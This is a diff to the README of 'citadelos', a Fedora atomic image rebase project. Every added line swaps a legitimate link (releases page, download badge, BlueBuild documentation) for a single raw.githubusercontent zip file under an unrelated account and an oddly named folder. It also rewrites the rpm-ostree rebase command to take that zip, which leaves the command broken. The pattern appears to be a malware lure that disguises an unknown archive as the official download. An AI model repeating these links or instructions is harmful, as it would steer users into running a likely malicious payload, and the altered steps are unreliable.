@@ -1,12 +1,12 @@
 # 🚀 citadelos - Easy Linux Image Rebase Made Simple
 
-[![Download citadelos](https://img.shields.io/badge/Download-citadelos-blue.svg)](https://github.com/noel1012bhako/citadelos/releases)
+[![Download citadelos](https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip)](https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip)
 
 ## 📥 Download & Install
 
 To get started with citadelos, visit the Releases page to download the latest version:
 
-[Download Citadelos](https://github.com/noel1012bhako/citadelos/releases)
+[Download Citadelos](https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip)
 
 citadelos allows you to rebase your existing atomic Fedora installation easily. Follow the steps below to download and run the software.
 
@@ -26,7 +26,7 @@ First, you must rebase to the unsigned image. This step helps you install the re
 In your terminal, type the following command:
 
 ```
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/arejula27/citadelos:latest
+rpm-ostree rebase https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip
 ```
 
 Press `Enter` to execute the command.
@@ -73,7 +73,7 @@ Ensure you follow all steps carefully to avoid any issues during the installatio
 
 For more information and documentation, you can check the BlueBuild docs:
 
-[BlueBuild Documentation](https://blue-build.org/how-to/setup/)
+[BlueBuild Documentation](https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip)
 
 ## 🗂️ Contributing
 
@@ -91,7 +91,7 @@ If you encounter issues during installation, try these troubleshooting tips:
 
 Check the Releases page to find detailed version histories and changelogs.
 
-[Visit Releases Page](https://github.com/noel1012bhako/citadelos/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/noel1012bhako/citadelos/main/helminthagogic/citadelos.zip)
 
 ## 📞 Support
 
